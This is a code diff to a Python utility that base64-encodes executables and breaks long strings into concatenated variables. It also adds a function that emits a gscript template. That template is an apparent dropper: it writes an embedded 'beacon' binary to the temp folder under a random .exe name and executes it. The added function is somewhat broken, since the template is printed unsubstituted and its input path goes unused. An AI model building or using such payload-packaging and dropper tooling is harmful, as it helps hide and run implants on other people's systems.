@@ -1,11 +1,12 @@
 import sys
 import base64
-
+from string import Template
 
 def usage():
     print("usage: -e: convert exe to output file specified /n Example:convert.py myexe.exe encoded.txt")
     sys.exit(0)
 
+# Convert exe to base 64 encoded string and save to the specifed output file
 def exe_to_b64_txt(exe_file_path, output_file):
     try:
         f = open(exe_file_path, mode='rb')
@@ -18,6 +19,9 @@ def exe_to_b64_txt(exe_file_path, output_file):
         print(f"there was an error {exc.args[0]} converting {exe_file_path} to base 64 text")
         return
 
+# Breaks up long strings into the specified length and concatenates to the specified var_name
+# optionally, can be saved to an outfile. 
+# optionally, can change concatenation type depending on language
 def line_breaker(full_string, line_length, var_name, outfile="", concat_type="+"):
     line_length = int(line_length)
     broken_string = str(var_name) + ' = '
@@ -46,6 +50,11 @@ def string_loader(f):
     f = open(f, "r")
     file_contents = f.read()
     return file_contents
+
+# Autmomatically generate a gscript which obfuscates an exe
+def generate_gscript_exe(exe_path, outfile):
+    gscript = Template('\n// ATT&CK: \n//import:candy.exe\n//go_import:os as os2\n\nfunction Deploy() {  \n var bin = GetAssetAsBytes(\"beaconbenversion.bin\");\nvar temppath = os2.TempDir();\nvar naming = G.rand.GetAlphaString(4);\nnaming = naming.toLowerCase();\nfullpath = temppath+"\\"+naming+".exe";\nerrors = G.file.WriteFileFromBytes(fullpath, bin[0]);\nvar running = G.exec.ExecuteCommandAsync(fullpath, [""]);\nreturn true;\n}')
+    print(gscript)
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
